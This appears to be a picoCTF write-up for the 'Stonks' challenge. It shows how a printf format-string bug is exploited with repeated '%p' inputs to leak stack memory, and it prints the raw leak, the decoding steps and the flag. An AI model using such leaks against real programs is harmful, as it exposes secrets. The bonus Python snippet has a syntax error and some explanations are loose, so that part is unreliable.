----------------------------------------------------------
Description
I decided to try something noone else has before. 
I made a bot to automatically trade stonks for me using AI and machine learning. 
I wouldn't believe you if you told me it's unsecure! 
vuln.c nc mercury.picoctf.net 6989
----------------------------------------------------------

1. Download the given input file 'vuln.c'

2. Try the stonks app by running the given 'nc mercury.picoctf.net 6989' command in terminal
    
3. Inspect the code of given input file
    - between lines 66-72 there is a mention about flag
    - line 93 is crucial for us
        - printf(user_buf);
        - it prints the result of a 'user_buf' function that is mentioned only on line 89
            - on line 89 there is only pointer inside of this char
            - user_buf is declared as char, so correctly it should be printed out with '%s' parameter or something like this
                - we can take advantage of this vulnerability to overflow the memory to print us hidden token which shouldnt be seen for public
                
4. Use the vulnerability
    - run app by running the command 'nc mercury.picoctf.net 6989'
    - Choose 1 for option '1) Buy some stonks!'
    - To answer the 'What is your API token' use '%p' to see what we get
        - '0x88f3370'
        - it seems weird, lets try to use '%p%p%p'
            - 0x99fc3900x804b0000x80489c3
            - okay, it seems to be increasing with more '%p' parameters, lets use 100 of them
                - '0x916e3f00x804b0000x80489c30xf7f8bd800xffffffff0x10x916c1600xf7f991100xf7f8bdc7(nil)0x916d1800x20x916e3d00x916e3f00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353861300x323565330xffa2007d0xf7fc6af80xf7f994400x478623000x1(nil)0xf7e28ce90xf7f9a0c00xf7f8b5c00xf7f8b0000xffa23a880xf7e1968d0xf7f8b5c00x8048eca0xffa23a94(nil)0xf7fadf090x804b0000xf7f8b0000xf7f8be200xffa23ac80xf7fb3d500xf7f8c8900x478623000xf7f8b0000x804b0000xffa23ac80x8048c860x916c1600xffa23ab40xffa23ac80x8048be90xf7f8b3fc(nil)0xffa23b7c0xffa23b740x10x10x916c1600x478623000xffa23ae0(nil)(nil)0xf7dcefa10xf7f8b0000xf7f8b000(nil)0xf7dcefa10x10xffa23b740xffa23b7c0xffa23b040x1(nil)0xf7f8b0000xf7fae70a0xf7fc6000(nil)0xf7f8b000(nil)(nil)0xbefb82510x43508441(nil)(nil)(nil)0x10x8048630(nil)0xf7fb3d500xf7fae9600x804b0000x10x8048630(nil)0x80486620x8048b85'
                - lets find out what is behind this output
                
5. Decode the given output using CyberChef
    - .n?..K...H..÷ø½.ÿÿÿÿ..l..÷ù..÷ø½Ç.m....n=..n?.ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}÷üjø÷ù.@G.#..÷â.é÷ù À÷øµÀ÷ø°.ÿ¢:.÷á..÷øµÀ.Hì
ÿ¢:.÷úß	.K..÷ø°.÷ø¾ ÿ¢:È÷û=P÷øÈ.G.#.÷ø°..K..ÿ¢:È.HÈ..l..ÿ¢:´ÿ¢:È.H¾	÷ø³üÿ¢;|ÿ¢;t...l..G.#.ÿ¢:à÷Üï¡÷ø°.÷ø°.÷Üï¡.ÿ¢;tÿ¢;|ÿ¢;..÷ø°.÷úç
÷ü`.÷ø°.¾û.QCP.A..Hc.÷û=P÷úé`.K....Hc..Hf..H¸.
    - we can see some sort of flag inside: 'ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}'
        - lets parse it correctly
            - delete useless parts of receit to get only the sort of flag:
                - 0x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353861300x323565330xffa2007d0x
            - Use 2 recipes:
                - From Hex with Auto delimiter
                - Swap endianness with Hex data format and 4 bytes word length
            - we obtained the correct flag :-) 
            
      BONUS      
            
        - we could also parse it correctly using python in terminal like this:
            - python
                s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}'
                for x in range (0,len(s),4):
                    print (s[x+3]+s[x+2]+s[x+1]s[x],end='')
